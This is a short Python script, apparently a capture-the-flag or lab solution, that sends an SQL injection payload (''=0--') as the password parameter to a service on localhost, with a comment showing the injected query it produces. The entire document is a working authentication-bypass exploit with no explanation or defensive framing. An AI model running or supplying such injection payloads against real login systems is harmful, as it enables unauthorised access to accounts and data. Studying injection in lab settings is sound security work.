import requests

url = "http://127.0.0.1:30030"
data = {
    "password":"'=0--"
}
#SELECT username, password FROM users WHERE password=''=0--';
response = requests.get(url=url, params=data)
print(response.text)